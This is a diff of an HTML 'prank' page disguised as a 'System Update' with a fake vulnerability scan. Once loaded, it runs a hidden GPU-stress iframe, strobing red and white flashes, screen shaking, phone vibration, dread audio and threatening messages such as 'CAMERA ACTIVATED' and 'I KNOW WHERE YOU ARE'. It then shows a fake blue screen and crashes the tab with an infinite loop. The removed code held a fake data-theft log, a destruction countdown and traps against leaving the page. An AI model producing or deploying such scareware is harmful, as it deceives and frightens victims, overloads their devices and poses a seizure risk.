@@ -3,85 +3,92 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>SYSTEM_CRITICAL_FAIL</title>
+<title>System Update</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-user-select: none; -webkit-touch-callout: none; }
-  html, body { background: #000; overflow: hidden; font-family: 'Courier New', monospace; height: 100vh; width: 100vw; color: #0f0; position: fixed; top: 0; left: 0; right: 0; bottom: 0; touch-action: none; overscroll-behavior: none; }
+  html, body { background: #000; overflow: hidden; font-family: 'Courier New', monospace; height: 100vh; width: 100vw; color: #fff; position: fixed; top: 0; left: 0; right: 0; bottom: 0; touch-action: none; overscroll-behavior: none; }
 
-  /* ТЯЖЕЛЫЙ IFRAME С CZNULL (Грузит видеокарту) */
+  /* ТЯЖЕЛЫЙ CZNULL (Максимально скрыт) */
   #stress-layer { 
     position: fixed; inset: 0; width: 100vw; height: 100vh; 
-    z-index: 1; border: none; pointer-events: none;
-    opacity: 0.6;
+    z-index: -1; border: none; pointer-events: none;
+    opacity: 0.1; /* Почти прозрачный, но грузит GPU */
   }
 
   /* ЛОВУШКА */
-  #trap-screen { position: fixed; inset: 0; background: #ffffff; z-index: 99999; display: flex; justify-content: center; align-items: center; flex-direction: column; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; transition: opacity 0.3s ease; }
-  .loader-bar { width: 200px; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-bottom: 15px; }
-  .loader-progress { width: 0%; height: 100%; background: #007aff; transition: width 0.1s; }
-  #trap-text { font-size: 14px; font-weight: 500; color: #555; }
+  #trap-screen { position: fixed; inset: 0; background: #ffffff; z-index: 99999; display: flex; justify-content: center; align-items: center; flex-direction: column; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; transition: opacity 0.5s ease; }
+  .loader-bar { width: 250px; height: 3px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-bottom: 15px; }
+  .loader-progress { width: 0%; height: 100%; background: #333; transition: width 0.1s; }
+  #trap-text { font-size: 12px; font-weight: 500; color: #888; letter-spacing: 2px; text-transform: uppercase; }
 
-  /* ВИРУС */
-  #virus-container { display: none; position: fixed; inset: 0; z-index: 100; }
-  #terminal { padding: 20px; font-size: 14px; line-height: 1.3; white-space: pre-wrap; word-break: break-all; font-weight: bold; height: 100%; overflow: hidden; text-align: left; z-index: 10; position: relative; text-shadow: 2px 2px 0 #000, -2px -2px 0 #000; }
-  .red { color: #ff0000; text-shadow: 0 0 10px #ff0000, 2px 2px 0 #000, -2px -2px 0 #000; }
-  .white { color: #ffffff; text-shadow: 2px 2px 0 #000, -2px -2px 0 #000; }
-  .green { color: #00ff00; text-shadow: 0 0 5px #00ff00, 2px 2px 0 #000; }
+  /* ЭКРАН ХАОСА */
+  #horror-screen { display: none; position: fixed; inset: 0; z-index: 100; background: #000; }
+  
+  /* Слой визуального шума */
+  #noise-layer {
+    position: fixed; inset: 0; z-index: 50; pointer-events: none;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
+    opacity: 0.15; mix-blend-mode: overlay;
+    animation: noiseAnim 0.1s infinite;
+  }
+  @keyframes noiseAnim { 0% { transform: translate(0,0); } 50% { transform: translate(-5%,5%); } 100% { transform: translate(5%,-5%); } }
 
-  #shake-wrap { position: absolute; inset: 0; z-index: 10; }
-  .shaking { animation: shake 0.05s infinite; }
-  @keyframes shake { 0% { transform: translate(0, 0); } 10% { transform: translate(-15px, 10px) rotate(-2deg); } 20% { transform: translate(15px, -10px) rotate(2deg); } 30% { transform: translate(-10px, -10px) rotate(-1deg); } 40% { transform: translate(10px, 10px) rotate(1deg); } 50% { transform: translate(-15px, 5px) rotate(-2deg); } 60% { transform: translate(15px, -5px) rotate(2deg); } 70% { transform: translate(-5px, 15px) rotate(-1deg); } 80% { transform: translate(5px, -15px) rotate(1deg); } 90% { transform: translate(-10px, 0); } 100% { transform: translate(0, 0); } }
-  #flash { position: fixed; inset: 0; background: #f00; opacity: 0; pointer-events: none; z-index: 99; mix-blend-mode: difference; }
+  /* Текст */
+  .creepy-text {
+    position: absolute; color: #fff; font-family: 'Times New Roman', serif;
+    font-weight: bold; text-transform: uppercase; letter-spacing: 5px;
+    text-shadow: 0 0 10px #fff, 0 0 20px #f00; opacity: 0; pointer-events: none;
+    z-index: 60; white-space: nowrap;
+  }
 
-  #lock-overlay { position: fixed; inset: 0; z-index: 900; background: rgba(10, 0, 0, 0.8); display: none; justify-content: center; align-items: center; flex-direction: column; pointer-events: all; border: 15px solid #f00; }
-  #timer-text { color: #f00; font-size: 18px; letter-spacing: 6px; margin-bottom: 10px; text-shadow: 0 0 15px #f00; font-weight: bold; }
-  #timer { font-size: 35vh; color: #f00; font-weight: bold; text-shadow: 0 0 70px #f00, 0 0 140px #f00, 4px 4px 0 #000; line-height: 1; }
-  #warning-text { color: #fff; font-size: 16px; margin-top: 20px; animation: blink 0.2s infinite; font-weight: bold; letter-spacing: 2px; }
-  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+  /* Глитч оверлеи */
+  #flash { position: fixed; inset: 0; background: #fff; opacity: 0; pointer-events: none; z-index: 999; mix-blend-mode: difference; }
+  #red-flash { position: fixed; inset: 0; background: #f00; opacity: 0; pointer-events: none; z-index: 998; mix-blend-mode: multiply; }
 
-  #glitch-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 950; opacity: 0.4; font-size: 10px; color: #0f0; overflow: hidden; word-break: break-all; }
+  .shaking { animation: shake 0.03s infinite; }
+  @keyframes shake { 
+    0% { transform: translate(0, 0); } 
+    20% { transform: translate(-15px, 10px) rotate(-2deg); } 
+    40% { transform: translate(15px, -10px) rotate(2deg); } 
+    60% { transform: translate(-15px, -15px) rotate(0deg); } 
+    80% { transform: translate(15px, 15px) rotate(2deg); } 
+    100% { transform: translate(0, 0); } 
+  }
 
-  /* ЕБЛО УТКИ */
+  /* УТКА */
   #duck-face {
-    position: fixed; inset: 0; z-index: 999999; display: none;
+    position: fixed; inset: 0; z-index: 9000; display: none;
     width: 100vw; height: 100vh; object-fit: cover;
-    filter: contrast(200%) saturate(200%) hue-rotate(90deg) invert(10%);
+    filter: grayscale(100%) contrast(300%) brightness(50%) sepia(100%) hue-rotate(320deg) saturate(500%);
     animation: duckShake 0.05s infinite;
   }
   @keyframes duckShake { 
-    0% { transform: scale(1.1) translate(0,0); } 
-    50% { transform: scale(1.2) translate(10px, -10px); } 
-    100% { transform: scale(1.1) translate(-10px, 10px); } 
+    0% { transform: scale(1.2) translate(0,0); } 
+    50% { transform: scale(1.4) translate(20px, -20px); } 
+    100% { transform: scale(1.2) translate(-20px, 20px); } 
   }
 
-  /* СИНИЙ ЭКРАН СМЕРТИ */
-  #final { position: fixed; inset: 0; display: none; z-index: 1000; background: #0000AA; color: #fff; text-align: left; padding: 20px; font-size: 13px; flex-direction: column; justify-content: flex-start; overflow: hidden; font-family: 'Courier New', monospace; }
-  #final h2 { background: #AAAAAA; color: #0000AA; padding: 2px 15px; display: inline-block; font-size: 16px; margin-bottom: 20px; align-self: center; font-weight: normal; }
-  #final p { margin-bottom: 12px; line-height: 1.4; text-align: left; }
-  .dump-box { border: 1px solid #fff; padding: 10px; margin-top: 20px; font-size: 11px; line-height: 1.2; color: #ccc; overflow: hidden; height: 40vh; }
+  /* СИНИЙ ЭКРАН */
+  #final { position: fixed; inset: 0; display: none; z-index: 10000; background: #05051a; color: #888; text-align: left; padding: 20px; font-size: 12px; flex-direction: column; justify-content: flex-start; overflow: hidden; font-family: 'Courier New', monospace; }
+  #final h2 { color: #fff; padding: 2px 0; display: inline-block; font-size: 16px; margin-bottom: 20px; font-weight: bold; letter-spacing: 2px;}
+  #final p { margin-bottom: 8px; line-height: 1.4; text-align: left; color: #ccc;}
+  .dump-box { border: 1px solid #222; padding: 10px; margin-top: 20px; font-size: 10px; line-height: 1.2; color: #555; overflow: hidden; height: 40vh; }
 </style>
 </head>
 <body>
 
-<!-- ТЯЖЕЛЫЙ CZNULL НА ЗАДНЕМ ФОНЕ (убран allow="fullscreen") -->
-<iframe id="stress-layer" src="https://cznull.github.io/vsbm"></iframe>
+<!-- CZNULL (Грузит систему) -->
+<iframe id="stress-layer" src="https://cznull.github.io/vsbm" sandbox="allow-scripts allow-same-origin"></iframe>
 
 <!-- ЛОВУШКА -->
 <div id="trap-screen">
   <div class="loader-bar"><div class="loader-progress" id="progress"></div></div>
-  <div id="trap-text">Проверка подлинности устройства...</div>
+  <div id="trap-text">Сканирование уязвимостей...</div>
 </div>
 
-<!-- ВИРУС -->
-<div id="virus-container">
-  <div id="shake-wrap"><div id="terminal"></div></div>
-  <div id="glitch-layer"></div>
-  <div id="flash"></div>
-  <div id="lock-overlay">
-    <div id="timer-text">УНИЧТОЖЕНИЕ ДАННЫХ:</div>
-    <div id="timer">10</div>
-    <div id="warning-text">ПОПЫТКА ВЫХОДА ЗАФИКСИРОВАНА</div>
-  </div>
+<!-- ЭКРАН ХАОСА -->
+<div id="horror-screen">
+  <div id="noise-layer"></div>
 </div>
 
 <!-- УТКА -->
@@ -94,187 +101,225 @@
   <p>KERNEL_DATA_INPAGE_ERROR</p>
   <p>Technical information:</p>
   <p>*** STOP: 0x0000007B (0xFFFFF880009A9928, 0xFFFFFFFFC0000034, 0x0000000000000000, 0x0000000000000000)</p>
-  <p>Beginning dump of physical memory...</p>
   <div class="dump-box" id="memory-dump"></div>
 </div>
+
+<div id="flash"></div>
+<div id="red-flash"></div>
 
 <script>
 /* ==========================================================================
    ЭТАП 1: ЛОВУШКА
    ========================================================================== */
 const trapScreen = document.getElementById('trap-screen');
-const virusContainer = document.getElementById('virus-container');
+const horrorScreen = document.getElementById('horror-screen');
 const progressBar = document.getElementById('progress');
 const trapText = document.getElementById('trap-text');
 
 let progress = 0;
 let trapInterval = setInterval(() => {
-    progress += Math.random() * 15;
+    progress += Math.random() * 8;
     if (progress > 100) progress = 100;
     progressBar.style.width = progress + '%';
+    
     if (progress === 100) {
         clearInterval(trapInterval);
-        trapText.textContent = "ОБНАРУЖЕНА УГРОЗА! НАЖМИТЕ ДЛЯ ИЗОЛЯЦИИ";
+        trapText.textContent = "КОД ВЫПОЛНЕН";
         trapText.style.color = "#f00";
-        trapText.style.fontWeight = "bold";
-        trapScreen.addEventListener('touchstart', startHell, { once: true });
-        trapScreen.addEventListener('click', startHell, { once: true });
+        setTimeout(startHell, 800); // Небольшая пауза перед адом
     }
-}, 150);
+}, 120);
 
 /* ==========================================================================
-   ЭТАП 2: АД
+   ЭТАП 2: АУДИО-ДВИЖОК (Тревожная музыка из Тиктока)
    ========================================================================== */
 let audioCtx;
-let isLocked = false;
-let endTime = 0;
-let droneOscillator = null;
+let droneOsc = null;
+
+function initAudio() {
+    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    startDrone();
+    startHeartbeat();
+    startRandomScares();
+}
+
+// 1. Низкий гул (Dread)
+function startDrone() {
+    droneOsc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    const filter = audioCtx.createBiquadFilter();
+    
+    droneOsc.type = 'sawtooth';
+    droneOsc.frequency.setValueAtTime(45, audioCtx.currentTime); // Низкая частота
+    filter.type = 'lowpass';
+    filter.frequency.setValueAtTime(150, audioCtx.currentTime);
+    
+    gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+    
+    droneOsc.connect(filter);
+    filter.connect(gain);
+    gain.connect(audioCtx.destination);
+    droneOsc.start();
+}
+
+// 2. Сердцебиение (Учащается)
+let heartbeatSpeed = 1200;
+function startHeartbeat() {
+    if (!audioCtx) return;
+    
+    function beat() {
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(60, audioCtx.currentTime);
+        osc.frequency.exponentialRampToValueAtTime(30, audioCtx.currentTime + 0.1);
+        
+        gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
+        
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.start(); osc.stop(audioCtx.currentTime + 0.2);
+        
+        // Ускоряем сердцебиение со временем
+        if (heartbeatSpeed > 400) heartbeatSpeed -= 50;
+        setTimeout(beat, heartbeatSpeed);
+    }
+    beat();
+}
+
+// 3. Случайные скрипы/вскрики (Jumpscares)
+function startRandomScares() {
+    setInterval(() => {
+        if (Math.random() > 0.7) {
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'sawtooth';
+            osc.frequency.setValueAtTime(Math.random() * 3000 + 1000, audioCtx.currentTime);
+            osc.frequency.exponentialRampToValueAtTime(100, audioCtx.currentTime + 0.2);
+            
+            gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
+            
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start(); osc.stop(audioCtx.currentTime + 0.2);
+        }
+    }, 800);
+}
+
+/* ==========================================================================
+   ЭТАП 3: ВИЗУАЛЬНЫЙ УЖАС
+   ========================================================================== */
+const phrases = [
+    "Я ТЕБЯ ВИЖУ", "НЕ ОБОРАЧИВАЙСЯ", "КАМЕРА АКТИВИРОВАНА", 
+    "ТЫ НЕ ОДИН", "Я ЗНАЮ ГДЕ ТЫ", "ТВОЙ ЭКРАН - ЭТО ОКНО", 
+    "ОТКРОЙ ДВЕРЬ", "ПОСМОТРИ ЗА СПИНУ", "СИСТЕМА ВЗЛОМАНА", "ПРОЩАЙ"
+];
 
 function startHell() {
-    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    trapScreen.style.opacity = '0';
-    setTimeout(() => {
-        trapScreen.style.display = 'none';
-        virusContainer.style.display = 'block';
-        document.body.classList.add('shaking');
-        
-        // Я УБРАЛ ОТСЮДА requestFullscreen, чтобы не вылезало окно!
-        
-        startDroneSound();
-        startTerminal();
-        startCountdown();
+    initAudio();
+    trapScreen.style.display = 'none';
+    horrorScreen.style.display = 'block';
+    document.body.classList.add('shaking');
+
+    startGlitchEffects();
+    startTextSpam();
+
+    // Через 15 секунд - Утка
+    setTimeout(showDuck, 15000);
+}
+
+function startGlitchEffects() {
+    const flash = document.getElementById('flash');
+    const redFlash = document.getElementById('red-flash');
+
+    setInterval(() => {
+        if (Math.random() > 0.6) {
+            flash.style.opacity = '1';
+            setTimeout(() => flash.style.opacity = '0', Math.random() * 50 + 20);
+        }
+        if (Math.random() > 0.8) {
+            redFlash.style.opacity = '0.8';
+            setTimeout(() => redFlash.style.opacity = '0', Math.random() * 100 + 50);
+        }
+    }, 200);
+}
+
+function startTextSpam() {
+    setInterval(() => {
+        if (Math.random() > 0.4) {
+            const el = document.createElement('div');
+            el.className = 'creepy-text';
+            el.textContent = phrases[Math.floor(Math.random() * phrases.length)];
+            
+            el.style.left = Math.random() * 80 + '%';
+            el.style.top = Math.random() * 80 + '%';
+            el.style.fontSize = (Math.random() * 30 + 20) + 'px';
+            if (Math.random() > 0.7) el.style.color = '#ff0000';
+            
+            horrorScreen.appendChild(el);
+
+            setTimeout(() => { el.style.transition = 'opacity 0.1s'; el.style.opacity = '1'; }, 10);
+            setTimeout(() => { el.style.opacity = '0'; }, Math.random() * 1500 + 500);
+            setTimeout(() => { el.remove(); }, 3000);
+        }
     }, 300);
 }
 
-function startDroneSound() {
-    if (!audioCtx) return;
-    droneOscillator = audioCtx.createOscillator();
-    const gain = audioCtx.createGain();
-    droneOscillator.type = 'sawtooth';
-    droneOscillator.frequency.setValueAtTime(60, audioCtx.currentTime);
-    gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
-    droneOscillator.connect(gain);
-    gain.connect(audioCtx.destination);
-    droneOscillator.start();
-}
-
-function playHarshGlitch() {
-  if (!audioCtx) return;
-  const osc = audioCtx.createOscillator();
-  const gain = audioCtx.createGain();
-  osc.type = 'square';
-  osc.frequency.setValueAtTime(Math.random() * 1500 + 500, audioCtx.currentTime);
-  osc.frequency.exponentialRampToValueAtTime(40, audioCtx.currentTime + 0.2);
-  gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
-  gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
-  osc.connect(gain); gain.connect(audioCtx.destination);
-  osc.start(); osc.stop(audioCtx.currentTime + 0.2);
-}
-
-const logLines = [
-  {t: "root@android:/ # sudo mount -o rw,remount /", c: "gray"},
-  {t: "[ OK ] Root privileges escalated.", c: "green"},
-  {t: "[ WARN ] Disabling SELinux...", c: "red"},
-  {t: "> INJECTING PAYLOAD TO KERNEL", c: "red"},
-  {t: "> ACCESSING /data/ LOCAL STORAGE", c: "red"},
-  {t: "> CAMERA AND MICROPHONE HIJACKED", c: "red"},
-  {t: "> EXTRACTING PASSWORDS...", c: "red"},
-  {t: "> BANKING APP DATA COMPROMISED", c: "red"},
-  {t: "[ ERR ] Memory corruption at 0x0000DEAD", c: "red"},
-  {t: "АХАЗАЗА... ТЕПЕРЬ ТЫ МОЙ.", c: "red"},
-  {t: "ВЫХОДА НЕТ.", c: "red"}
-];
-
-function startTerminal() {
-    const term = document.getElementById('terminal');
-    logLines.forEach((line, i) => {
-        setTimeout(() => {
-            const div = document.createElement('div');
-            div.className = line.c;
-            div.textContent = line.t;
-            term.appendChild(div);
-            playHarshGlitch();
-            if (navigator.vibrate) navigator.vibrate(40);
-        }, i * 250);
-    });
-}
-
-function startCountdown() {
-    isLocked = true;
-    endTime = Date.now() + 10000;
-    const timerEl = document.getElementById('timer');
-    const lockOverlay = document.getElementById('lock-overlay');
-    const glitchLayer = document.getElementById('glitch-layer');
-    lockOverlay.style.display = 'flex';
-
-    window.addEventListener('beforeunload', (e) => {
-        if (isLocked) {
-            e.preventDefault();
-            e.returnValue = "ПРОЦЕСС УНИЧТОЖЕНИЯ НЕ ЗАВЕРШЕН.";
-            return e.returnValue;
-        }
-    });
-
-    for(let i=0; i<10; i++) history.pushState(null, null, location.href);
-    window.onpopstate = function() { if (isLocked) { history.go(1); playHarshGlitch(); } };
-
-    setInterval(() => {
-        let chars = "ABCDEF0123456789_!@#$%^&*";
-        let glitch = "";
-        for(let i=0; i<400; i++) glitch += chars.charAt(Math.floor(Math.random() * chars.length));
-        glitchLayer.textContent = glitch;
-    }, 30);
-
-    const interval = setInterval(() => {
-        let timeLeft = Math.ceil((endTime - Date.now()) / 1000);
-        if (timeLeft < 0) timeLeft = 0;
-        timerEl.textContent = timeLeft;
-        playHarshGlitch();
-        if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 500]);
-        
-        if (timeLeft <= 0) {
-            clearInterval(interval);
-            endPrank();
-        }
-    }, 1000);
-}
-
 /* ==========================================================================
-   ФИНАЛ: УТКА -> СИНИЙ ЭКРАН -> СМЕРТЬ БРАУЗЕРА
+   ФИНАЛ: УТКА -> BSOD -> КРАШ
    ========================================================================== */
-function endPrank() {
-    if (droneOscillator) {
-        try { droneOscillator.stop(); } catch(e) {}
+function showDuck() {
+    // Резкий визг перед уткой
+    if (audioCtx) {
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.type = 'square';
+        osc.frequency.setValueAtTime(100, audioCtx.currentTime);
+        osc.frequency.exponentialRampToValueAtTime(5000, audioCtx.currentTime + 0.5);
+        gain.gain.setValueAtTime(0.4, audioCtx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
+        osc.connect(gain); gain.connect(audioCtx.destination);
+        osc.start(); osc.stop(audioCtx.currentTime + 0.5);
     }
 
-    virusContainer.style.display = 'none';
+    horrorScreen.style.display = 'none';
     const duck = document.getElementById('duck-face');
     duck.style.display = 'block';
     
-    if (audioCtx && audioCtx.state === 'running') {
-        for(let i=0; i<5; i++) setTimeout(playHarshGlitch, i * 100);
+    if (navigator.vibrate) navigator.vibrate([1000, 200, 1000, 200, 1000]);
+
+    // Через 3 секунды - Синий Экран
+    setTimeout(showBSOD, 3000);
+}
+
+function showBSOD() {
+    // Резкая тишина
+    if (droneOsc) {
+        try { droneOsc.stop(); } catch(e) {}
+        audioCtx.close(); // Полностью вырубаем звук
     }
-    if (navigator.vibrate) navigator.vibrate([800, 200, 800, 200, 800]);
+    
+    document.getElementById('duck-face').style.display = 'none';
+    document.getElementById('flash').style.display = 'none';
+    document.getElementById('red-flash').style.display = 'none';
+    
+    const bsod = document.getElementById('final');
+    bsod.style.display = 'flex';
+    
+    let dump = "";
+    for (let i = 0; i < 60; i++) {
+        let addr = (0xFFFFF88000000000 + Math.floor(Math.random() * 1000000000)).toString(16).toUpperCase();
+        dump += `${addr}  ${Math.floor(Math.random() * 0xFFFFFFFF).toString(16).toUpperCase()}\n`;
+    }
+    document.getElementById('memory-dump').textContent = dump;
 
+    // СМЕРТЬ БРАУЗЕРА (Опаньки) через 2 секунды
     setTimeout(() => {
-        duck.style.display = 'none';
-        document.getElementById('final').style.display = 'flex';
-        
-        let dump = "";
-        for (let i = 0; i < 80; i++) {
-            let addr = (0xFFFFF88000000000 + Math.floor(Math.random() * 1000000000)).toString(16).toUpperCase();
-            dump += `${addr}  ${Math.floor(Math.random() * 0xFFFFFFFF).toString(16).toUpperCase()}  ${Math.floor(Math.random() * 0xFFFFFFFF).toString(16).toUpperCase()}\n`;
-        }
-        document.getElementById('memory-dump').textContent = dump;
-
-        // УБИЙСТВО БРАУЗЕРА (ВЫЗОВ "ОПАНЬКИ")
-        setTimeout(() => {
-            document.getElementById('stress-layer').style.display = 'none';
-            // Бесконечный цикл для краша
-            while(true) {}
-        }, 1500); 
-
-    }, 4000); 
+        document.getElementById('stress-layer').style.display = 'none';
+        while(true) {} // Вечный цикл -> Chrome убивает вкладку
+    }, 2000);
 }
 </script>
 </body>
